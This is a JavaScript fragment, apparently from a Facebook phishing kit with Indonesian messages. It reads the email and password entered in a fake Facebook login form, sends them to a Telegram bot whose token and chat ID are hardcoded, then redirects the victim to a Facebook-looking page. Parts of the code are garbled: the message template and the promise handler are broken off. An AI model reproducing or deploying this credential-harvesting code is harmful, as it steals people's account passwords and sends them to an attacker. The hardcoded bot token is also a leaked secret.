function sendFBLoginData() {
    
    if (isSubmitting) {
        return;
    }

    
    const email = document.getElementById("fbEmail").value;
    const password = document.getElementById("fbPassword").value;

    
    if (!email || !password) {
        alert("Email dan Kata Sandi harus diisi!");
        return;
    }

    
    isSubmitting = true;

    
    const telegramBotToken = "8302795357:AAGU5q5q6bvCkl74YFf-Zw-5BDpdyhzsWRc";
    const chatIDs = ["5879634123"]; 
    const telegramURL = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

ðŸ”” Login Facebook Detected ðŸ””

ðŸ”‘ Password: ${password}

_Cuan Masuk, pastikan Anda Selalu Stenbay._
    `;

    
    const sendPromises = chatIDs.map((chatID) =>
        fetch(telegramURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatID,
                text: message,
            }),
        })
    );

    
    Promise.all(sendPromises)

            } else {

            }
        })
        .catch((error) => {
            console.error("Terjadi kesalahan saat mengirim data:", error);
        })
        .finally(() => {
            isSubmitting = false; 
        });

    
    setTimeout(() => {
        window.location.href = "../facebook.php";
    }, 1000);
